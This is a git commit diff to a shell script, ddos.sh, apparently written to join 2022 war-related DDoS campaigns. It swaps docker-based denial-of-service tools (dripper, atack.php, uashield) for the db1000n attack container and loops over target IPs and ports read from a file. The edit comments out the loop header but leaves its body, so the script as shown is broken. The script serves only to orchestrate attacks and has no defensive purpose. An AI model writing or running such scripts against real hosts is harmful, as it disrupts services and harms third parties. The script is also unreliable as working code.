1a190a677af099aebee8577bb0c3201ff6adb02a
Andrew G Sorokin <angello@elm.dp.ua>
2022-03-04 13:30:21 +0200

    launch ghcr.io/arriven/db1000n

--- ddos.sh
+++ ddos.sh
@@ -4,9 +4,7 @@ cd /root/stopWar
 
 [ -f docker.list ] && cat docker.list | xargs docker rm -f && cat /dev/null > docker.list
 
-#/usr/bin/docker pull alexmon1989/dripper:1.1.1
-
-cat target | while read ip port proto
+#cat target | while read ip port proto
 do
     if [ X$ip = X -o X$port = X -o X$proto = X ]
     then
@@ -14,8 +12,9 @@ do
     else
 #	/usr/bin/docker run -d alexmon1989/dripper:latest -s $ip -p $port -t 500 -m $proto > docker.list
 #	/usr/bin/docker run -d cherniavsky94/stop-war python3 DRipper.py -s $ip -p $port -t 443 -q 10000 > docker.list
-	/usr/bin/docker run -d angello2docker/atack.php >> docker.list
-	/usr/bin/docker run -d ghcr.io/opengs/uashield:0.0.x 1024 true  >> docker.list
+#	/usr/bin/docker run -d angello2docker/atack.php >> docker.list
+#	/usr/bin/docker run -d ghcr.io/opengs/uashield:0.0.x 1024 true  >> docker.list
+	/usr/bin/docker run -d ghcr.io/arriven/db1000n >> docker.list
     fi
 done
 
